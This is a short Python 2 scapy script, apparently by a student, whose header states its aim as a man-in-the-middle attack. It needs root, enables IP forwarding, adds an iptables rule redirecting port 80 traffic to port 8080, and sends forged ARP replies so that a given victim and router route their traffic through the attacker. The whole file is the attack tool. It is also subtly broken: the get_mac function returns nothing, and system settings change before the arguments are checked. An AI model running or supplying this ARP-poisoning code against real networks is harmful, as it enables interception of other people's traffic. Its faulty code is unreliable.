############################
# Author: Shaival Dalal    #
# Domain: Network Security #
# Aim:    MITM Attack	   #
############################

from scapy.all import *
import os
import sys

# The poison function is used to generate spoofed ARP packets to trick our victim and the router
def poison(routerIP,victimIP,interface):
	send(ARP(op='is-at',pdst=routerIP,psrc=victimIP,hwsrc=get_mac(interface)))
	send(ARP(op='is-at',pdst=victimIP,psrc=routerIP,hwsrc=get_mac(interface)))

# The get_mac function is used to fetch the hardware address of our system
def get_mac(interface):
	get_if_hwaddr(interface)

# If the program is not run as root, exit
if os.geteuid()!=0:
	sys.exit("Please run again as root")
	
#Set IP Forwarding to true and set IPTable rules to redirect traffic
os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

# Exit if victim's IP, router's IP and network interface not provided
if len(sys.argv)!=4:
	print "Arguments are in the following order <filename.py> <router IP> <victim IP> <default interface>"
	sys.exit(1)

routerIP=sys.argv[1]
victimIP=sys.argv[2]
interface=sys.argv[3]

for i in range(1,5):
	poison(routerIP,victimIP,interface)